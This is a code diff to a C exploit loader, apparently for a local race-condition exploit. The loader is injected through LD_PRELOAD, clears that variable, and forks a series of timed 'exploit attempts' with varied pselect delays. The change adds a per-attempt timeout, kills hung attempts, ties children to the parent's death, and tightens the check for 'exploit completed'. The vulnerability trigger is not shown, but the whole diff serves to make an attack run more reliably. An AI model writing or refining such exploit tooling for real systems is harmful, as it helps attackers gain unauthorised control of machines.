@@ -2,6 +2,7 @@
 
 #define DEFAULT_EXPLOIT_ATTEMPTS 16
 #define DEFAULT_PSELECT_DELAY_USEC 20000
+#define DEFAULT_ATTEMPT_TIMEOUT_SEC 45
 
 static int env_int(const char *name, int fallback, int min, int max) {
   const char *value = getenv(name);
@@ -39,6 +40,8 @@ __attribute__((constructor)) static void load(void) {
       "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
   int base_delay = env_int(
       "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
+  int attempt_timeout_sec = env_int(
+      "EXPLOIT_ATTEMPT_TIMEOUT_SEC", DEFAULT_ATTEMPT_TIMEOUT_SEC, 5, 300);
   if (getenv("SLIDE_ONLY")) {
     max_attempts = 1;
   }
@@ -46,13 +49,17 @@ __attribute__((constructor)) static void load(void) {
   unsetenv("LD_PRELOAD");
   char *argv[] = {"preload.so", NULL};
 
-  pr_success("preload supervisor pid=%d attempts=%d base_delay=%d\n",
-             getpid(), max_attempts, base_delay);
+  pr_success("preload supervisor pid=%d attempts=%d base_delay=%d timeout=%d\n",
+             getpid(), max_attempts, base_delay, attempt_timeout_sec);
 
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     int delay_usec = attempt_delay_usec(base_delay, attempt);
     pid_t child = SYSCHK(fork());
     if (child == 0) {
+      SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+      if (getppid() == 1) {
+        _exit(1);
+      }
       char delay[16];
       snprintf(delay, sizeof(delay), "%d", delay_usec);
       SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
@@ -62,15 +69,37 @@ __attribute__((constructor)) static void load(void) {
     }
 
     int status = 0;
-    pid_t waited;
-    do {
-      waited = waitpid(child, &status, 0);
-    } while (waited < 0 && errno == EINTR);
+    pid_t waited = 0;
+    struct timespec started;
+    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &started));
+    for (;;) {
+      waited = waitpid(child, &status, WNOHANG);
+      if (waited == child) {
+        break;
+      }
+      if (waited < 0 && errno != EINTR) {
+        break;
+      }
+
+      struct timespec now;
+      SYSCHK(clock_gettime(CLOCK_MONOTONIC, &now));
+      time_t elapsed = now.tv_sec - started.tv_sec;
+      if (elapsed >= attempt_timeout_sec) {
+        pr_warning("exploit attempt=%d/%d timeout pid=%d seconds=%d\n",
+                   attempt, max_attempts, child, attempt_timeout_sec);
+        SYSCHK(kill(child, SIGKILL));
+        do {
+          waited = waitpid(child, &status, 0);
+        } while (waited < 0 && errno == EINTR);
+        break;
+      }
+      usleep(100000);
+    }
     if (waited < 0) {
       pr_error("waitpid attempt=%d pid=%d errno=%d\n",
                attempt, child, errno);
     }
-    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
+    if (waited == child && WIFEXITED(status) && WEXITSTATUS(status) == 0) {
       pr_success("exploit completed attempt=%d/%d\n", attempt, max_attempts);
       return;
     }
